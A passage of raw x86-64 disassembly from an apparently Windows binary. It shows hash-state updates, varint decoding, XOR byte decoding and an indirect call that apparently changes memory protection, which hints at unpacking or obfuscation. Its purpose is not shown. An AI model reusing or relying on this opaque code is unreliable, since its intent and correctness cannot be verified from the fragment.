   1400566c0:	mov    BYTE PTR [rip+0x423c7],0x0        # 0x140098a8e
   1400566c7:	mov    eax,DWORD PTR [rbp+0x7d0]
   1400566cd:	add    DWORD PTR [rbp+0xd88],eax
   1400566d3:	mov    eax,DWORD PTR [rbp+0x7d4]
   1400566d9:	add    DWORD PTR [rbp+0xd8c],eax
   1400566df:	mov    eax,DWORD PTR [rbp+0x7d8]
   1400566e5:	add    DWORD PTR [rbp+0xd90],eax
   1400566eb:	mov    eax,DWORD PTR [rbp+0x7dc]
   1400566f1:	add    DWORD PTR [rbp+0xd94],eax
   1400566f7:	mov    eax,DWORD PTR [rbp+0x7e0]
   1400566fd:	add    DWORD PTR [rbp+0xd98],eax
   140056703:	mov    BYTE PTR [rip+0x42382],0x0        # 0x140098a8c
   14005670a:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   140056711:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   140056718:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14005671f:	xor    eax,eax
   140056721:	cmp    rax,0x14
   140056725:	je     0x14005673d
   140056727:	mov    ecx,DWORD PTR [rbp+rax*1+0xd88]
   14005672e:	bswap  ecx
   140056730:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   140056737:	add    rax,0x4
   14005673b:	jmp    0x140056721
   14005673d:	mov    r8,QWORD PTR [rbp+0xd20]
   140056744:	mov    eax,esi
   140056746:	shr    eax,0x3
   140056749:	and    eax,0x1f
   14005674c:	lea    rcx,[rax+rbp*1]
   140056750:	add    rcx,0x7d0
   140056757:	xor    r9d,r9d
   14005675a:	xor    edx,edx
   14005675c:	xor    eax,eax
   14005675e:	cmp    r9,0x10
   140056762:	je     0x14005677d
   140056764:	shld   rax,rdx,0x8
   140056769:	mov    r10,rdx
   14005676c:	shl    r10,0x8
   140056770:	movzx  edx,BYTE PTR [rcx+r9*1]
   140056775:	inc    r9
   140056778:	or     rdx,r10
   14005677b:	jmp    0x14005675e
   14005677d:	push   0xffffffffffffffff
   14005677f:	pop    r9
   140056781:	mov    r10,r9
   140056784:	mov    ecx,r8d
   140056787:	shl    r10,cl
   14005678a:	cmp    r8,0x40
   14005678e:	not    r10
   140056791:	cmovae r10,r9
   140056795:	and    esi,0x7
   140056798:	lea    ecx,[r8+rsi*1]
   14005679c:	neg    cl
   14005679e:	shrd   rdx,rax,cl
   1400567a2:	shr    rax,cl
   1400567a5:	test   cl,0x40
   1400567a8:	cmove  rax,rdx
   1400567ac:	and    rax,r10
   1400567af:	mov    rsi,QWORD PTR [rbp+0xd60]
   1400567b6:	add    r8,0x7
   1400567ba:	bswap  rax
   1400567bd:	shr    r8,0x3
   1400567c1:	mov    QWORD PTR [rbp+0x1060],rax
   1400567c8:	mov    r9,rsi
   1400567cb:	imul   r9,r8
   1400567cf:	push   0x8
   1400567d1:	pop    rcx
   1400567d2:	sub    rcx,r8
   1400567d5:	dec    r8
   1400567d8:	mov    rax,QWORD PTR [rbp+0x1168]
   1400567df:	lea    r11,[rax+r9*1]
   1400567e3:	mov    rax,r9
   1400567e6:	xor    edx,edx
   1400567e8:	push   0x14
   1400567ea:	pop    rdi
   1400567eb:	div    rdi
   1400567ee:	cmp    rcx,0x8
   1400567f2:	je     0x140056818
   1400567f4:	cmp    r8,0x7
   1400567f8:	ja     0x140059d80
   1400567fe:	imul   rax,rax,0xffffffffffffffec
   140056802:	mov    al,BYTE PTR [r11+rax*1]
   140056806:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   14005680d:	inc    rcx
   140056810:	inc    r11
   140056813:	inc    r9
   140056816:	jmp    0x1400567e3
   140056818:	mov    r11,QWORD PTR [rbp+0x1060]
   14005681f:	bswap  r11
   140056822:	and    r11,r10
   140056825:	inc    rsi
   140056828:	mov    QWORD PTR [rbp+0xd60],rsi
   14005682f:	mov    r9,QWORD PTR [rbp+0xdd0]
   140056836:	mov    rax,QWORD PTR [rbp+0xdc0]
   14005683d:	mov    r8,QWORD PTR [rbp+0xdc8]
   140056844:	mov    rdx,r9
   140056847:	sub    rdx,r8
   14005684a:	sub    rdx,rax
   14005684d:	mov    rcx,QWORD PTR [rbp+0xd20]
   140056854:	cmp    rdx,rcx
   140056857:	cmovae rdx,rcx
   14005685b:	cmp    rdx,0x1
   14005685f:	adc    rdx,0x0
   140056863:	mov    r10d,ecx
   140056866:	sub    r10d,edx
   140056869:	and    r10b,0x3f
   14005686d:	cmp    rcx,rdx
   140056870:	movzx  ecx,r10b
   140056874:	mov    r10d,0x0
   14005687a:	cmovbe ecx,r10d
   14005687e:	shr    r11,cl
   140056881:	mov    r10,QWORD PTR [rbp+0xdb0]
   140056888:	mov    rsi,QWORD PTR [rbp+0xdb8]
   14005688f:	mov    ecx,edx
   140056891:	shld   rsi,r10,cl
   140056895:	shl    r10,cl
   140056898:	test   dl,0x40
   14005689b:	cmovne rsi,r10
   14005689f:	mov    ecx,0x0
   1400568a4:	cmove  rcx,r10
   1400568a8:	or     rcx,r11
   1400568ab:	mov    QWORD PTR [rbp+0xdb8],rsi
   1400568b2:	mov    QWORD PTR [rbp+0xdb0],rcx
   1400568b9:	add    rax,rdx
   1400568bc:	mov    QWORD PTR [rbp+0xdc0],rax
   1400568c3:	jmp    0x14005636f
   1400568c8:	add    rax,0xfffffffffffffff8
   1400568cc:	mov    QWORD PTR [rbp+0xdc0],rax
   1400568d3:	mov    r9,QWORD PTR [rbp+0xdb8]
   1400568da:	mov    r10,r9
   1400568dd:	mov    ecx,eax
   1400568df:	shr    r10,cl
   1400568e2:	mov    r11,QWORD PTR [rbp+0xdb0]
   1400568e9:	mov    rdx,r11
   1400568ec:	shrd   rdx,r9,cl
   1400568f0:	push   0xffffffffffffffff
   1400568f2:	pop    rdi
   1400568f3:	mov    rsi,rdi
   1400568f6:	shl    rsi,cl
   1400568f9:	test   al,0x40
   1400568fb:	cmovne rdx,r10
   1400568ff:	mov    ecx,0x0
   140056904:	cmove  rcx,rsi
   140056908:	cmove  rsi,rdi
   14005690c:	not    rsi
   14005690f:	not    rcx
   140056912:	and    rcx,r11
   140056915:	and    rsi,r9
   140056918:	test   rax,rax
   14005691b:	cmove  rsi,rax
   14005691f:	cmove  rcx,rax
   140056923:	mov    QWORD PTR [rbp+0xdb0],rcx
   14005692a:	mov    QWORD PTR [rbp+0xdb8],rsi
   140056931:	add    r8,0x8
   140056935:	mov    QWORD PTR [rbp+0xdc8],r8
   14005693c:	inc    r15
   14005693f:	lea    rcx,[rbp+0xcc0]
   140056946:	call   0x14003c141
   14005694b:	jmp    0x140056341
   140056950:	mov    rcx,QWORD PTR [rbp+0xcc0]
   140056957:	mov    rdx,QWORD PTR [rbp+0xcc8]
   14005695e:	call   0x14006f7f7
   140056963:	lea    rcx,[rbp+0xcc0]
   14005696a:	push   0x8
   14005696c:	pop    rdx
   14005696d:	call   0x14003c111
   140056972:	xor    r14d,r14d
   140056975:	cmp    r14,0x8
   140056979:	je     0x140056f89
   14005697f:	mov    r8,QWORD PTR [rbp+0xdc8]
   140056986:	mov    r9,QWORD PTR [rbp+0xdd0]
   14005698d:	lea    rax,[r8+0x8]
   140056991:	cmp    rax,r9
   140056994:	jbe    0x14005699d
   140056996:	xor    edx,edx
   140056998:	jmp    0x140056f75
   14005699d:	mov    rax,QWORD PTR [rbp+0xdc0]
   1400569a4:	cmp    rax,0x8
   1400569a8:	jae    0x140056f01
   1400569ae:	mov    rcx,QWORD PTR [rbp+0xd60]
   1400569b5:	cmp    rcx,QWORD PTR [rbp+0xd68]
   1400569bc:	jae    0x140056a02
   1400569be:	mov    rcx,QWORD PTR [rbp+0xd18]
   1400569c5:	mov    rdx,QWORD PTR [rbp+0xd58]
   1400569cc:	cmp    rdx,rcx
   1400569cf:	jae    0x140056a02
   1400569d1:	lea    rax,[rbx+0x10]
   1400569d5:	movzx  r13d,BYTE PTR [rax+rdx*1]
   1400569da:	and    r13d,0x7f
   1400569de:	lea    rax,[rdx+0x1]
   1400569e2:	cmp    rax,rcx
   1400569e5:	jae    0x140056a10
   1400569e7:	movzx  r8d,BYTE PTR [rbx+rdx*1+0x11]
   1400569ed:	test   r8b,r8b
   1400569f0:	jns    0x140056a0a
   1400569f2:	shl    r13,0x7
   1400569f6:	and    r8d,0x7f
   1400569fa:	or     r13,r8
   1400569fd:	mov    rdx,rax
   140056a00:	jmp    0x1400569de
   140056a02:	xor    r11d,r11d
   140056a05:	jmp    0x140056e7d
   140056a0a:	inc    rdx
   140056a0d:	mov    rcx,rdx
   140056a10:	mov    QWORD PTR [rbp+0xd58],rcx
   140056a17:	mov    rax,r13
   140056a1a:	shr    rax,0x8
   140056a1e:	mov    rsi,r13
   140056a21:	shr    rsi,0x28
   140056a25:	movaps XMMWORD PTR [rbp+0x740],xmm7
   140056a2c:	movaps XMMWORD PTR [rbp+0x730],xmm7
   140056a33:	movaps XMMWORD PTR [rbp+0x720],xmm7
   140056a3a:	movaps XMMWORD PTR [rbp+0x710],xmm7
   140056a41:	mov    DWORD PTR [rbp+0x7d0],eax
   140056a47:	lea    rax,[rip+0x3160a]        # 0x140088058
   140056a4e:	mov    QWORD PTR [rsp+0x20],rax
   140056a53:	lea    rcx,[rbp+0x710]
   140056a5a:	push   0x4
   140056a5c:	pop    rdx
   140056a5d:	lea    r8,[rbp+0x7d0]
   140056a64:	mov    r9,rdx
   140056a67:	call   0x1400638fe
   140056a6c:	mov    BYTE PTR [rbp+0x714],sil
   140056a73:	mov    rsi,QWORD PTR [rbp+0xd30]
   140056a7a:	cmp    QWORD PTR [rbp+0xd78],rsi
   140056a81:	jbe    0x140056bb1
   140056a87:	mov    r9,QWORD PTR [rbp+0xd38]
   140056a8e:	cmp    r9,0x4
   140056a92:	ja     0x140059d9c
   140056a98:	mov    rcx,QWORD PTR [rbp+0xd40]
   140056a9f:	cmp    rcx,0x5
   140056aa3:	jae    0x140059dae
   140056aa9:	mov    r8,QWORD PTR [rbp+0xd78]
   140056ab0:	cmp    r8,rsi
   140056ab3:	je     0x140059dbc
   140056ab9:	mov    eax,DWORD PTR [rbp+rcx*4+0xd88]
   140056ac0:	mov    cl,BYTE PTR [rbp+0xd48]
   140056ac6:	rol    eax,cl
   140056ac8:	sub    r8,rsi
   140056acb:	xor    eax,DWORD PTR [rbp+r9*4+0xd88]
   140056ad3:	xor    edx,edx
   140056ad5:	div    r8
   140056ad8:	mov    rdi,rdx
   140056adb:	mov    rax,QWORD PTR [rbp+0xd80]
   140056ae2:	mov    QWORD PTR [rbp+0x1060],rax
   140056ae9:	cmp    rsi,0x40
   140056aed:	push   0x40
   140056aef:	pop    rax
   140056af0:	cmovae rsi,rax
   140056af4:	movaps XMMWORD PTR [rbp+0x800],xmm7
   140056afb:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   140056b02:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   140056b09:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   140056b10:	lea    rcx,[rbp+0x7d0]
   140056b17:	mov    rdx,rsi
   140056b1a:	call   0x14003c0b8
   140056b1f:	mov    r10,QWORD PTR [rbp+0xd78]
   140056b26:	test   r10,r10
   140056b29:	je     0x140056b77
   140056b2b:	mov    rcx,rax
   140056b2e:	mov    r8,rdx
   140056b31:	mov    rax,rdx
   140056b34:	add    rax,rdi
   140056b37:	mov    r9,QWORD PTR [rbp+0xd70]
   140056b3e:	cmp    rax,r10
   140056b41:	jbe    0x140056b61
   140056b43:	xor    r11d,r11d
   140056b46:	cmp    r8,r11
   140056b49:	je     0x140056b77
   140056b4b:	lea    rax,[r11+rdi*1]
   140056b4f:	xor    edx,edx
   140056b51:	div    r10
   140056b54:	mov    al,BYTE PTR [r9+rdx*1]
   140056b58:	mov    BYTE PTR [rcx+r11*1],al
   140056b5c:	inc    r11
   140056b5f:	jmp    0x140056b46
   140056b61:	add    r9,rdi
   140056b64:	xor    eax,eax
   140056b66:	cmp    r8,rax
   140056b69:	je     0x140056b77
   140056b6b:	mov    dl,BYTE PTR [r9+rax*1]
   140056b6f:	mov    BYTE PTR [rcx+rax*1],dl
   140056b72:	inc    rax
   140056b75:	jmp    0x140056b66
   140056b77:	mov    rcx,QWORD PTR [rbp+0xd28]
   140056b7e:	xor    eax,eax
   140056b80:	cmp    rsi,rax
   140056b83:	je     0x140056bb1
   140056b85:	cmp    rcx,0x3f
   140056b89:	ja     0x140059d8e
   140056b8f:	mov    edx,eax
   140056b91:	and    edx,0x7
   140056b94:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   140056b9b:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   140056ba2:	inc    rax
   140056ba5:	mov    BYTE PTR [rbp+rcx*1+0x710],dl
   140056bac:	inc    rcx
   140056baf:	jmp    0x140056b80
   140056bb1:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   140056bb8:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   140056bbf:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   140056bc6:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   140056bcd:	xor    eax,eax
   140056bcf:	cmp    rax,0x40
   140056bd3:	je     0x140056beb
   140056bd5:	mov    ecx,DWORD PTR [rbp+rax*1+0x710]
   140056bdc:	bswap  ecx
   140056bde:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   140056be5:	add    rax,0x4
   140056be9:	jmp    0x140056bcf
   140056beb:	movups xmm0,XMMWORD PTR [rbp+0xd88]
   140056bf2:	mov    eax,DWORD PTR [rbp+0xd98]
   140056bf8:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   140056bff:	mov    DWORD PTR [rbp+0x7e0],eax
   140056c05:	and    DWORD PTR [rbp+0x7e4],0x0
   140056c0c:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   140056c13:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   140056c1a:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   140056c21:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   140056c28:	lea    rax,[rbp+0x7e8]
   140056c2f:	movups XMMWORD PTR [rax+0x30],xmm3
   140056c33:	movups XMMWORD PTR [rax+0x20],xmm2
   140056c37:	movups XMMWORD PTR [rax+0x10],xmm1
   140056c3b:	movups XMMWORD PTR [rax],xmm0
   140056c3e:	call   0x140064214
   140056c43:	mov    al,BYTE PTR [rip+0x41e44]        # 0x140098a8d
   140056c49:	cmp    al,0x1
   140056c4b:	je     0x140056c94
   140056c4d:	movzx  eax,al
   140056c50:	cmp    eax,0x2
   140056c53:	je     0x140056d3a
   140056c59:	and    DWORD PTR [rbp+0x640],0x0
   140056c60:	lea    rcx,[rip+0xfffffffffffaa419]        # 0x140001080
   140056c67:	mov    rdx,QWORD PTR [rbp+0x1150]
   140056c6e:	push   0x40
   140056c70:	pop    r8
   140056c72:	lea    r9,[rbp+0x640]
   140056c79:	call   QWORD PTR [rip+0x3db89]        # 0x140094808
   140056c7f:	test   eax,eax
   140056c81:	sete   cl
   140056c84:	inc    cl
   140056c86:	mov    BYTE PTR [rip+0x41e01],cl        # 0x140098a8d
   140056c8c:	test   eax,eax
   140056c8e:	je     0x140056d3a
   140056c94:	mov    al,BYTE PTR [rip+0x41f1e]        # 0x140098bb8
   140056c9a:	cmp    al,0x1
   140056c9c:	je     0x140056cc1
   140056c9e:	movzx  eax,al
   140056ca1:	test   eax,eax
   140056ca3:	jne    0x140056d3a
   140056ca9:	call   0x140065d51
   140056cae:	test   rax,rax
   140056cb1:	sete   cl
   140056cb4:	inc    cl
   140056cb6:	mov    BYTE PTR [rip+0x41efc],cl        # 0x140098bb8
   140056cbc:	test   rax,rax
   140056cbf:	je     0x140056d3a
   140056cc1:	call   0x140064227
   140056cc6:	mov    eax,0xc8c291de
   140056ccb:	xchg   DWORD PTR [rip+0x41e0f],eax        # 0x140098ae0
   140056cd1:	call   QWORD PTR [rip+0x3d979]        # 0x140094650
   140056cd7:	mov    eax,eax
   140056cd9:	mov    QWORD PTR [rip+0x41320],rax        # 0x140098000
   140056ce0:	lea    rcx,[rbp+0x7d0]
   140056ce7:	push   0xffffffffffffffff
   140056ce9:	pop    rdx
   140056cea:	call   0x14002b840
   140056cef:	xor    eax,eax
   140056cf1:	xchg   DWORD PTR [rip+0x41de9],eax        # 0x140098ae0
   140056cf7:	mov    BYTE PTR [rip+0x41d90],0x0        # 0x140098a8e
   140056cfe:	mov    eax,DWORD PTR [rbp+0x7d0]
   140056d04:	add    DWORD PTR [rbp+0xd88],eax
   140056d0a:	mov    eax,DWORD PTR [rbp+0x7d4]
   140056d10:	add    DWORD PTR [rbp+0xd8c],eax
   140056d16:	mov    eax,DWORD PTR [rbp+0x7d8]
   140056d1c:	add    DWORD PTR [rbp+0xd90],eax
   140056d22:	mov    eax,DWORD PTR [rbp+0x7dc]
   140056d28:	add    DWORD PTR [rbp+0xd94],eax
   140056d2e:	mov    eax,DWORD PTR [rbp+0x7e0]
   140056d34:	add    DWORD PTR [rbp+0xd98],eax
   140056d3a:	mov    BYTE PTR [rip+0x41d4b],0x0        # 0x140098a8c
   140056d41:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   140056d48:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   140056d4f:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   140056d56:	xor    eax,eax
   140056d58:	cmp    rax,0x14
   140056d5c:	je     0x140056d74
   140056d5e:	mov    ecx,DWORD PTR [rbp+rax*1+0xd88]
   140056d65:	bswap  ecx
   140056d67:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   140056d6e:	add    rax,0x4
   140056d72:	jmp    0x140056d58
   140056d74:	mov    r8,QWORD PTR [rbp+0xd20]
   140056d7b:	mov    eax,r13d
   140056d7e:	shr    eax,0x3
   140056d81:	and    eax,0x1f
   140056d84:	lea    rcx,[rax+rbp*1]
   140056d88:	add    rcx,0x7d0
   140056d8f:	xor    r9d,r9d
   140056d92:	xor    edx,edx
   140056d94:	xor    eax,eax
   140056d96:	cmp    r9,0x10
   140056d9a:	je     0x140056db5
   140056d9c:	shld   rax,rdx,0x8
   140056da1:	mov    r10,rdx
   140056da4:	shl    r10,0x8
   140056da8:	movzx  edx,BYTE PTR [rcx+r9*1]
   140056dad:	inc    r9
   140056db0:	or     rdx,r10
   140056db3:	jmp    0x140056d96
   140056db5:	push   0xffffffffffffffff
   140056db7:	pop    r9
   140056db9:	mov    r10,r9
   140056dbc:	mov    ecx,r8d
   140056dbf:	shl    r10,cl
   140056dc2:	cmp    r8,0x40
   140056dc6:	not    r10
   140056dc9:	cmovae r10,r9
   140056dcd:	and    r13d,0x7
   140056dd1:	lea    ecx,[r8+r13*1]
   140056dd5:	neg    cl
   140056dd7:	shrd   rdx,rax,cl
   140056ddb:	shr    rax,cl
   140056dde:	test   cl,0x40
   140056de1:	cmove  rax,rdx
   140056de5:	and    rax,r10
   140056de8:	mov    rsi,QWORD PTR [rbp+0xd60]
   140056def:	add    r8,0x7
   140056df3:	bswap  rax
   140056df6:	shr    r8,0x3
   140056dfa:	mov    QWORD PTR [rbp+0x1060],rax
   140056e01:	mov    r9,rsi
   140056e04:	imul   r9,r8
   140056e08:	push   0x8
   140056e0a:	pop    rcx
   140056e0b:	sub    rcx,r8
   140056e0e:	dec    r8
   140056e11:	mov    rax,QWORD PTR [rbp+0x1168]
   140056e18:	lea    r11,[rax+r9*1]
   140056e1c:	mov    rax,r9
   140056e1f:	xor    edx,edx
   140056e21:	push   0x14
   140056e23:	pop    rdi
   140056e24:	div    rdi
   140056e27:	cmp    rcx,0x8
   140056e2b:	je     0x140056e51
   140056e2d:	cmp    r8,0x7
   140056e31:	ja     0x140059d80
   140056e37:	imul   rax,rax,0xffffffffffffffec
   140056e3b:	mov    al,BYTE PTR [r11+rax*1]
   140056e3f:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   140056e46:	inc    rcx
   140056e49:	inc    r11
   140056e4c:	inc    r9
   140056e4f:	jmp    0x140056e1c
   140056e51:	mov    r11,QWORD PTR [rbp+0x1060]
   140056e58:	bswap  r11
   140056e5b:	and    r11,r10
   140056e5e:	inc    rsi
   140056e61:	mov    QWORD PTR [rbp+0xd60],rsi
   140056e68:	mov    r9,QWORD PTR [rbp+0xdd0]
   140056e6f:	mov    rax,QWORD PTR [rbp+0xdc0]
   140056e76:	mov    r8,QWORD PTR [rbp+0xdc8]
   140056e7d:	mov    rdx,r9
   140056e80:	sub    rdx,r8
   140056e83:	sub    rdx,rax
   140056e86:	mov    rcx,QWORD PTR [rbp+0xd20]
   140056e8d:	cmp    rdx,rcx
   140056e90:	cmovae rdx,rcx
   140056e94:	cmp    rdx,0x1
   140056e98:	adc    rdx,0x0
   140056e9c:	mov    r10d,ecx
   140056e9f:	sub    r10d,edx
   140056ea2:	and    r10b,0x3f
   140056ea6:	cmp    rcx,rdx
   140056ea9:	movzx  ecx,r10b
   140056ead:	mov    r10d,0x0
   140056eb3:	cmovbe ecx,r10d
   140056eb7:	shr    r11,cl
   140056eba:	mov    r10,QWORD PTR [rbp+0xdb0]
   140056ec1:	mov    rsi,QWORD PTR [rbp+0xdb8]
   140056ec8:	mov    ecx,edx
   140056eca:	shld   rsi,r10,cl
   140056ece:	shl    r10,cl
   140056ed1:	test   dl,0x40
   140056ed4:	cmovne rsi,r10
   140056ed8:	mov    ecx,0x0
   140056edd:	cmove  rcx,r10
   140056ee1:	or     rcx,r11
   140056ee4:	mov    QWORD PTR [rbp+0xdb8],rsi
   140056eeb:	mov    QWORD PTR [rbp+0xdb0],rcx
   140056ef2:	add    rax,rdx
   140056ef5:	mov    QWORD PTR [rbp+0xdc0],rax
   140056efc:	jmp    0x1400569a4
   140056f01:	add    rax,0xfffffffffffffff8
   140056f05:	mov    QWORD PTR [rbp+0xdc0],rax
   140056f0c:	mov    r9,QWORD PTR [rbp+0xdb8]
   140056f13:	mov    r10,r9
   140056f16:	mov    ecx,eax
   140056f18:	shr    r10,cl
   140056f1b:	mov    r11,QWORD PTR [rbp+0xdb0]
   140056f22:	mov    rdx,r11
   140056f25:	shrd   rdx,r9,cl
   140056f29:	push   0xffffffffffffffff
   140056f2b:	pop    rdi
   140056f2c:	mov    rsi,rdi
   140056f2f:	shl    rsi,cl
   140056f32:	test   al,0x40
   140056f34:	cmovne rdx,r10
   140056f38:	mov    ecx,0x0
   140056f3d:	cmove  rcx,rsi
   140056f41:	cmove  rsi,rdi
   140056f45:	not    rsi
   140056f48:	not    rcx
   140056f4b:	and    rcx,r11
   140056f4e:	and    rsi,r9
   140056f51:	test   rax,rax
   140056f54:	cmove  rsi,rax
   140056f58:	cmove  rcx,rax
   140056f5c:	mov    QWORD PTR [rbp+0xdb0],rcx
   140056f63:	mov    QWORD PTR [rbp+0xdb8],rsi
   140056f6a:	add    r8,0x8
   140056f6e:	mov    QWORD PTR [rbp+0xdc8],r8
   140056f75:	inc    r14
   140056f78:	lea    rcx,[rbp+0xcc0]
   140056f7f:	call   0x14003c141
   140056f84:	jmp    0x140056975
   140056f89:	mov    rbx,QWORD PTR [rbp+0xcc0]
   140056f90:	mov    r13,QWORD PTR [rbp+0xcc8]
   140056f97:	mov    rsi,QWORD PTR [rbp+0xcd0]
   140056f9e:	add    rsi,r13
   140056fa1:	mov    QWORD PTR [rbp+0x7d0],r13
   140056fa8:	mov    QWORD PTR [rbp+0x7d8],rsi
   140056faf:	mov    QWORD PTR [rbp+0x7e0],0x8
   140056fba:	and    QWORD PTR [rbp+0x7e8],0x0
   140056fc2:	xor    edi,edi
   140056fc4:	lea    rcx,[rbp+0x7d0]
   140056fcb:	call   0x14003ba96
   140056fd0:	test   rdx,rdx
   140056fd3:	je     0x140056fe5
   140056fd5:	movzx  edx,BYTE PTR [rdx]
   140056fd8:	shl    eax,0x3
   140056fdb:	mov    ecx,eax
   140056fdd:	shl    rdx,cl
   140056fe0:	or     rdi,rdx
   140056fe3:	jmp    0x140056fc4
   140056fe5:	mov    rax,QWORD PTR [rbp+0x5e0]
   140056fec:	xor    rax,rdi
   140056fef:	movabs rcx,0x4f1bbcdca8279931
   140056ff9:	imul   rdi,rcx
   140056ffd:	rol    rdi,0x11
   140057001:	xor    rdi,rax
   140057004:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14005700b:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   140057012:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   140057019:	movaps XMMWORD PTR [rbp+0x800],xmm7
   140057020:	movaps XMMWORD PTR [rbp+0x810],xmm7
   140057027:	movaps XMMWORD PTR [rbp+0x820],xmm7
   14005702e:	movaps XMMWORD PTR [rbp+0x830],xmm7
   140057035:	movaps XMMWORD PTR [rbp+0x840],xmm7
   14005703c:	mov    r9,rdi
   14005703f:	movabs rax,0x748e804be25a7077
   140057049:	xor    r9,rax
   14005704c:	mov    r10,rdi
   14005704f:	or     r10,0x1
   140057053:	rol    r10,0x15
   140057057:	mov    r11,r12
   14005705a:	shr    r11,0x4
   14005705e:	inc    r11
   140057061:	xor    r14d,r14d
   140057064:	cmp    r14,QWORD PTR [rbp+0xf78]
   14005706b:	je     0x14005713b
   140057071:	mov    rax,r14
   140057074:	movabs rcx,0x32a27dbe0b6bcf37
   14005707e:	imul   rax,rcx
   140057082:	rol    rax,0x20
   140057086:	xor    rax,rdi
   140057089:	mov    rcx,r10
   14005708c:	push   0x7
   14005708e:	pop    rdx
   14005708f:	mov    r8,r9
   140057092:	sub    edx,0x1
   140057095:	jb     0x1400570cb
   140057097:	mov    r15,rcx
   14005709a:	xor    r15,rax
   14005709d:	add    r15,r8
   1400570a0:	rol    r15,0x28
   1400570a4:	add    rax,r15
   1400570a7:	rol    rax,0xf
   1400570ab:	mov    r8,rax
   1400570ae:	shr    r8,0x1d
   1400570b2:	xor    rax,r8
   1400570b5:	movabs r8,0x79ca1cd2f36bd757
   1400570bf:	imul   r15,r8
   1400570c3:	add    rcx,r10
   1400570c6:	mov    r8,r15
   1400570c9:	jmp    0x140057092
   1400570cb:	lea    rcx,[r14*4+0x3]
   1400570d3:	xor    r15d,r15d
   1400570d6:	cmp    rcx,QWORD PTR [rbp+0x1148]
   1400570dd:	jae    0x1400570f2
   1400570df:	lea    rcx,[r14*4+0x0]
   1400570e7:	mov    rdx,QWORD PTR [rbp+0x1138]
   1400570ee:	mov    r15d,DWORD PTR [rdx+rcx*1]
   1400570f2:	xor    r8,rax
   1400570f5:	mov    rax,r8
   1400570f8:	shr    rax,0x18
   1400570fc:	xor    edx,edx
   1400570fe:	push   0x1f
   140057100:	pop    rcx
   140057101:	div    ecx
   140057103:	lea    ecx,[rdx+0x1]
   140057106:	ror    r15d,cl
   140057109:	mov    rax,r8
   14005710c:	shr    rax,0x10
   140057110:	mov    rcx,r8
   140057113:	shr    rcx,0x28
   140057117:	xor    ecx,eax
   140057119:	xor    r8d,ecx
   14005711c:	xor    r8d,r15d
   14005711f:	mov    rax,r8
   140057122:	xor    edx,edx
   140057124:	div    r11
   140057127:	shl    rdx,0x4
   14005712b:	mov    QWORD PTR [rbp+r14*8+0x7d0],rdx
   140057133:	inc    r14
   140057136:	jmp    0x140057064
   14005713b:	and    QWORD PTR [rbp+0xcc0],0x0
   140057143:	mov    QWORD PTR [rbp+0x1060],r13
   14005714a:	mov    QWORD PTR [rbp+0x1068],rsi
   140057151:	mov    QWORD PTR [rbp+0x1070],0x8
   14005715c:	and    QWORD PTR [rbp+0x1078],0x0
   140057164:	lea    rcx,[rbp+0x1060]
   14005716b:	call   0x14003ba96
   140057170:	test   rdx,rdx
   140057173:	je     0x14005718a
   140057175:	cmp    rax,0x7
   140057179:	ja     0x14004a57a
   14005717f:	mov    cl,BYTE PTR [rdx]
   140057181:	mov    BYTE PTR [rbp+rax*1+0xcc0],cl
   140057188:	jmp    0x140057164
   14005718a:	mov    ecx,0x80
   14005718f:	lea    rdi,[rbp+0x710]
   140057196:	lea    rsi,[rbp+0x7d0]
   14005719d:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   14005719f:	mov    rsi,QWORD PTR [rbp+0xcc0]
   1400571a6:	mov    rcx,rbx
   1400571a9:	mov    rdx,r13
   1400571ac:	call   0x14006f7f7
   1400571b1:	mov    rcx,QWORD PTR [rbp+0x7a0]
   1400571b8:	mov    rdx,QWORD PTR [rbp+0x1138]
   1400571bf:	call   0x14006f7f7
   1400571c4:	mov    QWORD PTR [rbp+0x3d0],rsi
   1400571cb:	mov    rax,QWORD PTR [rbp+0xd58]
   1400571d2:	sub    QWORD PTR [rbp+0xf70],rax
   1400571d9:	jb     0x14005a158
   1400571df:	mov    ecx,DWORD PTR [rbp+0x6f4]
   1400571e5:	mov    DWORD PTR [rbp+0x1060],ecx
   1400571eb:	mov    ecx,DWORD PTR [rbp+0x6f0]
   1400571f1:	mov    DWORD PTR [rbp+0x1064],ecx
   1400571f7:	mov    ecx,DWORD PTR [rbp+0x6ec]
   1400571fd:	mov    DWORD PTR [rbp+0x1068],ecx
   140057203:	mov    ecx,DWORD PTR [rbp+0x6e8]
   140057209:	mov    DWORD PTR [rbp+0x106c],ecx
   14005720f:	mov    ecx,DWORD PTR [rbp+0x4f8]
   140057215:	mov    DWORD PTR [rbp+0x1070],ecx
   14005721b:	je     0x14005a158
   140057221:	mov    rdi,QWORD PTR [rbp+0x1178]
   140057228:	add    rdi,rax
   14005722b:	mov    rcx,QWORD PTR [rbp+0x1158]
   140057232:	lea    rdx,[rbp+0x1060]
   140057239:	call   0x14003ad8d
   14005723e:	mov    eax,DWORD PTR [rbp+0x1070]
   140057244:	lea    rdx,[rbp+0x7d8]
   14005724b:	mov    DWORD PTR [rdx+0x80],eax
   140057251:	movups xmm0,XMMWORD PTR [rbp+0x1060]
